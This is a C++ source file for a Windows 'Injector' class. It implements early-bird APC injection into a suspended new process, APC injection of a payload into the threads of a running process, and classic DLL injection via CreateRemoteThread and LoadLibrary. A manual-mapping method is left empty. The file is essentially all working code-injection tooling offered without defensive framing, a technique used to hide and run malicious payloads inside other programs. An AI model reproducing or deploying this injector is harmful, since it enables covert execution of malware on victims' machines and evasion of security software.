//
// Created by eeleephaant on 06.12.2024.
//

#include <iostream>
#include "Injector.h"


DWORD Injector::getPid(char *processName) {
    HANDLE hPID = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    PROCESSENTRY32 procEntry;
    procEntry.dwSize = sizeof(procEntry);

    do {
        if (!strcmp(procEntry.szExeFile, processName)) {
            DWORD dwPID = procEntry.th32ProcessID;
            CloseHandle(hPID);

            return dwPID;
        }
    } while (Process32Next(hPID, &procEntry));
}

void Injector::ManualMappingInject(char *bytecode, size_t bytecodeSize) {

}

void Injector::EarlyAPCInject(char *exePath, char *payload, size_t payloadSize) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(exePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        DWORD err = GetLastError();
        std::cerr << "Create process error: " << err;
        return;
    } else {
        LPVOID addr = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (addr == NULL) {
            DWORD err = GetLastError();
            std::cerr << "VirtualAllocEx error: " << err;
            return;
        } else {
            if (!WriteProcessMemory(pi.hProcess, addr, payload, payloadSize, NULL)) {
                DWORD err = GetLastError();
                std::cerr << "WriteProcessMemory error: " << err;
                return;
            } else {
                PTHREAD_START_ROUTINE pfnAPC = (PTHREAD_START_ROUTINE) addr;
                if (!QueueUserAPC((PAPCFUNC) pfnAPC, pi.hThread, NULL)) {
                    DWORD err = GetLastError();
                    std::cerr << "QueueUserAPC error: " << err;
                    return;
                } else {
                    ResumeThread(pi.hThread);
                    std::cout << "Resumed thread with payload";
                }
            }
        }
    }


}

void Injector::APCInject(char *processName, char *payload, size_t payloadSize) {
    DWORD pid = Injector::getPid(processName);
    std::cout << pid << std::endl;
    DWORD OldProtect = 0;
    DWORD target_process_id = Injector::getPid(processName);
    HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, target_process_id);
    LPVOID target_process_buffer = VirtualAllocEx(target_process_handle, NULL, payloadSize, MEM_RESERVE | MEM_COMMIT,
                                                  PAGE_READWRITE);
    WriteProcessMemory(target_process_handle, target_process_buffer, payload, payloadSize, NULL);
    VirtualProtectEx(target_process_handle, target_process_buffer, payloadSize, PAGE_EXECUTE, &OldProtect);


    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    for (Thread32First(snapshot, &te); Thread32Next(snapshot, &te);) {
        if (te.th32OwnerProcessID == target_process_id) {

            HANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, te.th32ThreadID);
            if (target_thread_handle == NULL) {
                continue;
            }

            if (QueueUserAPC((PAPCFUNC) target_process_buffer, target_thread_handle, NULL)) {
                printf("Queuing an APC to thread id %d\n", te.th32ThreadID);
                return;
            }

        }
    }
}

void Injector::defaultInject(char *dllName, char *processName) {
    char dllPath[MAX_PATH];
    GetFullPathNameA(dllName, MAX_PATH, dllPath, NULL);

    DWORD pid = Injector::getPid(processName);

    HANDLE hProcess = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE |
            PROCESS_VM_OPERATION, false, pid);
    LPVOID allocatedMem = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    WriteProcessMemory(hProcess, allocatedMem, dllPath, sizeof(dllPath), NULL);

    CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE) LoadLibrary, allocatedMem, 0, 0);

    CloseHandle(hProcess);

}
